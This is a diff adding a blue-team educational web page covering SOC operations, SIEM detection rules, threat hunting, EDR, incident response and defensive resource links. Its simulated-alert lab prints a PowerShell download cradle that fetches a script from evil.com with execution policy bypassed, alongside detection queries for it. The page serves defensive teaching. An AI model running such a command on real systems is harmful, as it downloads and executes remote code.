@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>🔵 Blue Team Citadel | Defensive Security & SOC</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: radial-gradient(circle at 10% 30%, #0a1428, #030612);
+            font-family: 'Inter', sans-serif;
+            color: #e2eaff;
+            line-height: 1.5;
+            overflow-x: hidden;
+        }
+        #blue-mist {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+        .citadel {
+            position: relative;
+            z-index: 2;
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 1.5rem;
+        }
+        .hero {
+            text-align: center;
+            background: rgba(8, 20, 48, 0.65);
+            backdrop-filter: blur(12px);
+            border-radius: 2.5rem;
+            padding: 2rem 1rem;
+            margin-bottom: 2rem;
+            border: 1px solid #3b82f6aa;
+        }
+        .hero h1 {
+            font-size: 3rem;
+            background: linear-gradient(135deg, #7aaaff, #2c6eff);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+        .section {
+            background: rgba(12, 22, 45, 0.7);
+            backdrop-filter: blur(10px);
+            border-radius: 2rem;
+            border: 1px solid #3b82f680;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+        }
+        .section-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #b8e1ff, #5a9eff);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            border-left: 6px solid #3b82f6;
+            padding-left: 1rem;
+            margin-bottom: 1.2rem;
+        }
+        .grid-2, .grid-3 {
+            display: grid;
+            gap: 1.5rem;
+        }
+        .grid-2 { grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); }
+        .grid-3 { grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); }
+        .card {
+            background: #0c1230;
+            border-radius: 1.5rem;
+            padding: 1.2rem;
+            border: 1px solid #3b82f660;
+            transition: 0.2s;
+        }
+        .card:hover {
+            border-color: #5a9eff;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px #2c6eff20;
+        }
+        .card h3 {
+            color: #8db5ff;
+            margin-bottom: 0.8rem;
+        }
+        .badge {
+            background: #1e3a8a60;
+            border: 1px solid #3b82f6;
+            border-radius: 2rem;
+            padding: 0.2rem 0.7rem;
+            font-size: 0.7rem;
+            display: inline-block;
+            margin: 0.2rem;
+        }
+        .link-list {
+            display: flex;
+            flex-direction: column;
+            gap: 0.6rem;
+        }
+        .link-list a {
+            color: #b8e1ff;
+            text-decoration: none;
+            border-left: 3px solid #3b82f6;
+            padding-left: 0.8rem;
+            transition: 0.1s;
+        }
+        .link-list a:hover {
+            color: white;
+            border-left-width: 5px;
+            transform: translateX(4px);
+        }
+        .code-block {
+            background: #03081a;
+            padding: 1rem;
+            border-radius: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            border-left: 3px solid #3b82f6;
+            overflow-x: auto;
+        }
+        hr {
+            border-color: #3b82f640;
+            margin: 1rem 0;
+        }
+        footer {
+            text-align: center;
+            font-size: 0.75rem;
+            opacity: 0.7;
+            margin-top: 2rem;
+        }
+        @media (max-width: 760px) {
+            .hero h1 { font-size: 1.8rem; }
+            .section-title { font-size: 1.4rem; }
+        }
+    </style>
+</head>
+<body>
+<canvas id="blue-mist"></canvas>
+<div class="citadel">
+    <div class="hero">
+        <h1>🔵 Blue Team Citadel</h1>
+        <p>Defensive Security • SOC Operations • Threat Hunting • Incident Response • Cyber Resilience</p>
+    </div>
+
+    <!-- Blue Team Core -->
+    <div class="section">
+        <div class="section-title">🛡️ Blue Team: Defender's Mindset</div>
+        <div class="grid-2">
+            <div class="card">
+                <h3>🎯 Mission</h3>
+                <p>Monitor, detect, respond, and contain threats. Proactive security: hardening, vulnerability management, threat intelligence, detection engineering.</p>
+                <p><strong>Key metrics:</strong> MTTD (mean time to detect), MTTR (mean time to respond).</p>
+            </div>
+            <div class="card">
+                <h3>🔄 Purple Team Integration</h3>
+                <p>Collaboration with Red Team: emulate attacks, test detections, tune SIEM rules, improve visibility. Outcome: stronger defenses.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- SOC & Monitoring -->
+    <div class="section">
+        <div class="section-title">📡 Security Operations Center (SOC)</div>
+        <div class="grid-2">
+            <div class="card">
+                <h3>🔍 SOC Tiers & Functions</h3>
+                <p>🔹 Tier 1: Alert triage, initial investigation<br>
+                🔹 Tier 2: Incident validation, deeper analysis<br>
+                🔹 Tier 3: Advanced hunting, malware analysis<br>
+                🔹 Tier 4: Threat hunting, intelligence integration</p>
+                <p>Tools: SIEM (Splunk, Sentinel, QRadar), SOAR, EDR.</p>
+            </div>
+            <div class="card">
+                <h3>📊 SIEM & Log Management</h3>
+                <p>Centralized log aggregation (Sysmon, Windows Event Logs, firewall, proxies). Detection rules (Sigma, KQL, SPL). Use cases: brute force, privilege escalation, lateral movement.</p>
+                <div class="code-block"># Example Sigma rule for suspicious process creation (ransomware pattern)<br>
+title: Possible Ransomware Activity<br>
+status: experimental<br>
+logsource: product: windows, category: process_creation<br>
+detection: selection: Image|endswith: '\vssadmin.exe'</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Threat Hunting & Detection -->
+    <div class="section">
+        <div class="section-title">🔎 Threat Hunting & Detection Engineering</div>
+        <div class="grid-2">
+            <div class="card">
+                <h3>📌 Hypothesis-Driven Hunting</h3>
+                <p>Based on MITRE ATT&CK tactics. Examples: hunting for pass-the-hash (event ID 4624 with logon type 9), unusual scheduled tasks, Kerberoasting (4688, 4769).</p>
+                <p>Tools: <strong>Kusto Query Language (Azure Data Explorer), Splunk ES, Elastic Stack, Velociraptor</strong>.</p>
+            </div>
+            <div class="card">
+                <h3>🧬 Detection as Code</h3>
+                <p>Atomic Red Team, Sigma rules, and unit testing for detections. Use <strong>Sigma</strong> to create SIEM-agnostic rules, <strong>Atomic Red Team</strong> to validate.</p>
+                <div class="code-block"># Simulated detection: abnormal outbound network connection<br>
+index=windows src_ip=internal* dest_port=445 | stats count by dest_ip | where count > 100</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- EDR & Endpoint Defense -->
+    <div class="section">
+        <div class="section-title">🖥️ Endpoint Detection & Response (EDR)</div>
+        <div class="grid-3">
+            <div class="card"><h3>🔹 EDR Capabilities</h3>Process tree, memory inspection, command line telemetry, remote shell, isolation, rollback. Vendors: CrowdStrike, Microsoft Defender for Endpoint, SentinelOne, Carbon Black.</div>
+            <div class="card"><h3>✋ Hardening Guides</h3>Attack surface reduction rules, AppLocker, WDAC, LAPS, credential guard, exploit protection. Disable LLMNR, SMB signing.</div>
+            <div class="card"><h3>🛠️ Sysmon & Logging</h3>Sysmon event ID 1 (process creation), 3 (network), 7 (image loaded). Forward via Winlogbeat or NXLog to SIEM.</div>
+        </div>
+        <div class="code-block">
+            # Install Sysmon with full config<br>
+            Sysmon64.exe -accepteula -i sysmonconfig.xml
+        </div>
+    </div>
+
+    <!-- Incident Response Process -->
+    <div class="section">
+        <div class="section-title">🚨 Incident Response Lifecycle (NIST SP 800-61)</div>
+        <div class="grid-2">
+            <div class="card">
+                <h3>1. Preparation & 2. Detection</h3>
+                <p>IR plan, playbooks, tabletop exercises. Detect via SIEM, AV, EDR, user reports.</p>
+            </div>
+            <div class="card">
+                <h3>3. Analysis & 4. Containment</h3>
+                <p>Forensic imaging, memory analysis (Volatility), timeline analysis. Short-term containment (block IP, isolate host) and long-term (patch, reset creds).</p>
+            </div>
+            <div class="card">
+                <h3>5. Eradication & 6. Recovery</h3>
+                <p>Remove malware, close backdoors, restore clean backups. Recovery monitoring.</p>
+            </div>
+            <div class="card">
+                <h3>7. Post-Incident (Lessons Learned)</h3>
+                <p>Retrospective, improve detection, update playbooks, share IOCs.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Defensive Frameworks & Standards -->
+    <div class="section">
+        <div class="section-title">📜 Blue Team Frameworks & Standards</div>
+        <div class="grid-2">
+            <div class="card">
+                <h3>🔹 NIST Cybersecurity Framework (CSF)</h3>
+                <p>Identify → Protect → Detect → Respond → Recover. Core functions & implementation tiers.</p>
+                <h3>🔹 MITRE ATT&CK for Defenders</h3>
+                <p>Use the ATT&CK matrix to map detection gaps, prioritize mitigations. <strong>ATT&CK Navigator</strong> for visualization.</p>
+            </div>
+            <div class="card">
+                <h3>🔹 Cyber Kill Chain (Lockheed Martin)</h3>
+                <p>Break attack phases to detect earlier (recon → weaponization → delivery → exploit → C2 → lateral movement).</p>
+                <h3>🔹 CIS Controls (Critical Security Controls)</h3>
+                <p>Implementation Group 1 (basic cyber hygiene) – IG2/IG3.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Blue Team Resources & Links (curated) -->
+    <div class="section">
+        <div class="section-title">📚 Blue Team Library · Essential Links</div>
+        <div class="grid-3">
+            <div class="card">
+                <h3>🔵 SOC/IR Tools</h3>
+                <div class="link-list">
+                    <a href="https://www.thehive-project.org/" target="_blank" rel="noopener">► TheHive – Incident Response platform</a>
+                    <a href="https://www.velocidex.com/velociraptor/" target="_blank">► Velociraptor – Endpoint visibility & hunting</a>
+                    <a href="https://www.splunk.com/" target="_blank">► Splunk – SIEM leader (free dev license)</a>
+                    <a href="https://www.elastic.co/security" target="_blank">► Elastic Security – SIEM + EDR (free version)</a>
+                    <a href="https://github.com/SigmaHQ/sigma" target="_blank">► Sigma – Generic rule format for SIEMs</a>
+                </div>
+            </div>
+            <div class="card">
+                <h3>📖 Training & Certifications</h3>
+                <div class="link-list">
+                    <a href="https://www.sans.org/cyber-security-courses/" target="_blank">► SANS SEC450 (Blue Team Ops)</a>
+                    <a href="https://www.cybrary.it/course/incident-response/" target="_blank">► Cybrary – Incident Response</a>
+                    <a href="https://www.blue-team-training.com/" target="_blank">► Blue Team Training Online</a>
+                    <a href="https://letsdefend.io/" target="_blank">► LetsDefend – Blue Team SOC simulator</a>
+                    <a href="https://tryhackme.com/paths/blue-team" target="_blank">► TryHackMe – Blue Team path</a>
+                </div>
+            </div>
+            <div class="card">
+                <h3>🧠 Threat Intelligence & Blogs</h3>
+                <div class="link-list">
+                    <a href="https://www.sans.org/cyber-security-summit/archives/" target="_blank">► SANS Summit Archives</a>
+                    <a href="https://www.ired.team/" target="_blank">► iRed Team – Offensive notes (use for defense)</a>
+                    <a href="https://thedfirreport.com/" target="_blank">► The DFIR Report – Real incident write-ups</a>
+                    <a href="https://www.cisa.gov/cybersecurity" target="_blank">► CISA – Alerts & best practices</a>
+                    <a href="https://redcanary.com/blog/" target="_blank">► Red Canary – Detection reports</a>
+                </div>
+            </div>
+            <div class="card">
+                <h3>⚙️ Threat Hunting & Detection</h3>
+                <div class="link-list">
+                    <a href="https://github.com/hunters-forge/OSSEM" target="_blank">► OSSEM – Event mapping project</a>
+                    <a href="https://uncoder.io/" target="_blank">► Uncoder.io – Sigma to SIEM converter</a>
+                    <a href="https://kqlquery.com/" target="_blank">► KQL Query examples (Sentinel)</a>
+                    <a href="https://www.threatminer.org/" target="_blank">► ThreatMiner – IOC enrichment</a>
+                    <a href="https://virustotal.com/" target="_blank">► VirusTotal – Hash/domain analysis</a>
+                </div>
+            </div>
+        </div>
+        <hr>
+        <p style="font-size:0.8rem; text-align:center;">💙 Build resilient defenses: continuously test, train, and improve. Blue Team mindset = proactive protection.</p>
+    </div>
+
+    <!-- Simulated Detection Scenario -->
+    <div class="section">
+        <div class="section-title">🕹️ Interactive Detection Lab (Example)</div>
+        <div class="grid-2">
+            <div class="card">
+                <h3>📋 Scenario: Suspicious PowerShell download cradle</h3>
+                <p>Log source: Windows Event 4104 (PowerShell script block). Detection query (Splunk): <code>index=main EventCode=4104 ScriptBlockText="*downloadstring*"</code></p>
+                <p>Response: Isolate host, capture memory, block remote IP, analyze executed script.</p>
+            </div>
+            <div class="card">
+                <h3>🔍 Simulated Alert</h3>
+                <div class="code-block">
+Alert: "PowerShell download cradle" on host WS-APP01<br>
+User: administrator<br>
+Process: powershell.exe -exec bypass -c (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')<br>
+Action: Terminate process + quarantine endpoint.
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>🔵 Blue Team Citadel — defend, detect, respond. Strengthen your security posture with continuous improvement.</footer>
+</div>
+
+<script>
+    // Animated particles (icy blue theme)
+    const canvas = document.getElementById("blue-mist");
+    let ctx = canvas.getContext("2d");
+    let particles = [];
+    function resizeCanvas() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+    }
+    class BlueParticle {
+        constructor() {
+            this.x = Math.random() * canvas.width;
+            this.y = Math.random() * canvas.height;
+            this.r = Math.random() * 2.2 + 0.8;
+            this.vx = (Math.random() - 0.5) * 0.2;
+            this.vy = (Math.random() - 0.5) * 0.15 + 0.08;
+            this.alpha = Math.random() * 0.5 + 0.1;
+            this.color = `rgba(59, 130, 246, ${this.alpha})`;
+        }
+        update() {
+            this.x += this.vx;
+            this.y += this.vy;
+            if(this.x < -20) this.x = canvas.width + 20;
+            if(this.x > canvas.width+20) this.x = -20;
+            if(this.y < -20) this.y = canvas.height+20;
+            if(this.y > canvas.height+20) this.y = -20;
+        }
+        draw() {
+            ctx.beginPath();
+            ctx.arc(this.x, this.y, this.r, 0, Math.PI*2);
+            ctx.fillStyle = this.color;
+            ctx.shadowBlur = 6;
+            ctx.shadowColor = "#3b82f6";
+            ctx.fill();
+        }
+    }
+    function initParticles(cnt = 140) {
+        particles = [];
+        for(let i=0;i<cnt;i++) particles.push(new BlueParticle());
+    }
+    function animate() {
+        if(!ctx) return;
+        ctx.clearRect(0,0,canvas.width,canvas.height);
+        for(let p of particles) {
+            p.update();
+            p.draw();
+        }
+        requestAnimationFrame(animate);
+    }
+    window.addEventListener('resize', () => {
+        resizeCanvas();
+        initParticles(140);
+    });
+    resizeCanvas();
+    initParticles(150);
+    animate();
+</script>
+</body>
+</html>
